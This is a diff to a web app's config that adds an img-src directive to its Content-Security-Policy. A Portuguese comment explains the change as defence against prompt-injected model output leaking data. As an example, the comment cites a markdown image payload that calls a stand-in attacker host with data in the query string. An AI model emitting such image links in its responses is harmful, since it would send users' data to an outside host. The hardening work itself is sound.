@@ -27,11 +27,15 @@ export default defineConfig(() => ({
 						"referrer-policy": "strict-origin-when-cross-origin",
 						"permissions-policy": "camera=(), microphone=(), geolocation=()",
 						"strict-transport-security": "max-age=31536000; includeSubDomains",
-						// CSP só com diretivas que não tocam script/estilo/imagem: o TanStack Start emite
-						// script inline e os apps carregam imagem externa, e uma CSP estrita derrubaria
-						// produção. `frame-ancestors` é o sucessor do X-Frame-Options (que fica para
-						// navegador antigo); `base-uri` impede `<base>` injetado de sequestrar URL relativa.
-						"content-security-policy": "frame-ancestors 'self'; base-uri 'self'; object-src 'none'; form-action 'self'",
+						// CSP sem script/estilo: o TanStack Start emite script inline, e uma CSP estrita
+						// derrubaria produção. `frame-ancestors` é o sucessor do X-Frame-Options (que fica
+						// para navegador antigo); `base-uri` impede `<base>` injetado de sequestrar URL
+						// relativa. `img-src`: imagem só do próprio app e de `data:`/`blob:` (ícones e prévias geradas no navegador). Imagem é o canal de exfiltração por texto injetado em
+						// resposta de modelo (`![](https://atacante/?d=…)`): o render já não carrega imagem
+						// de modelo, e a CSP fecha o canal se outro render deixar passar. Host novo de
+						// imagem entra aqui. Sem `connect-src` por ora: os destinos de `fetch` dependem de
+						// env (Supabase, α) e de devtools em dev — ver o PR que introduziu `img-src`.
+						"content-security-policy": "frame-ancestors 'self'; base-uri 'self'; object-src 'none'; form-action 'self'; img-src 'self' data: blob:",
 					},
 				},
 				"/assets/**": { headers: { "cache-control": "public, max-age=31536000, immutable" } },
